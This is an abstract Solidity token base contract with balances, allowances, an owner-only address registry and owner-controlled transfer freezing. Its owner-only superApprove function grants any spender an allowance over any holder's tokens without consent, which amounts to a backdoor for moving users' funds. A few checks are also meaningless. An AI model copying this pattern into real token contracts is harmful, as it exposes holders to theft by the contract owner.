pragma solidity ^0.4.18;

import "./SafeMath.sol";
import "./Owned.sol";

contract BasicToken is owned {
    using SafeMath for uint256;

    mapping (address => uint256) internal balance_of;
    mapping (address => mapping (address => uint256)) internal allowances;

    mapping (address => bool) private address_exist;
    address [] private address_list;

    bool public transfer_close = false;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function BasicToken() public {
    }

    function balanceOf(address token_owner) public constant returns (uint balance) {
        return balance_of[token_owner];
    }

    function allowance(
        address _hoarder,
        address _spender
    ) public constant returns (uint256) {
        return allowances[_hoarder][_spender];
    }

    function superApprove(
        address _hoarder,
        address _spender,
        uint256 _value
    ) onlyOwner public returns(bool) {
        require(_hoarder != address(0));
        require(_spender != address(0));
        require(_value >= 0);
        allowances[_hoarder][_spender] = _value;
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        require(msg.sender != address(0));
        require(_spender != address(0));
        require(_value >= 0);
        allowances[msg.sender][_spender] = _value;
        return true;
    }

    function getAddressLength() onlyOwner public constant returns (uint) {
        return address_list.length;
    }

    function getAddressIndex(uint _address_index) onlyOwner public constant returns (address _address) {
        _address = address_list[_address_index];
    }

    function getAllAddress() onlyOwner public constant returns (address []) {
        return address_list;
    }

    function getAddressExist(address _target) public constant returns (bool) {
        if (_target == address(0)) {
            return false;
        } else {
            return address_exist[_target];
        }
    }

    function addAddress(address _target) internal returns(bool) {
        if (_target == address(0)) {
            return false;
        } else if (address_exist[_target] == true) {
            return false;
        } else {
            address_exist[_target] = true;
            address_list[address_list.length++] = _target;
        }
    }

    function mintToken(
        address _to,
        uint256 token_amount,
        uint256 freeze_timestamp
    ) onlyOwner public returns (bool);

    function superMint(
        address _to,
        uint256 token_amount,
        uint256 freeze_timestamp
    ) onlyOwner public returns(bool);

    function transfer(address to, uint256 value) public;
    function transferFrom(address _from, address _to, uint256 _amount) public;

    function transferOpen() onlyOwner public {
        transfer_close = false;
    }

    function transferClose() onlyOwner public {
        transfer_close = true;
    }
}
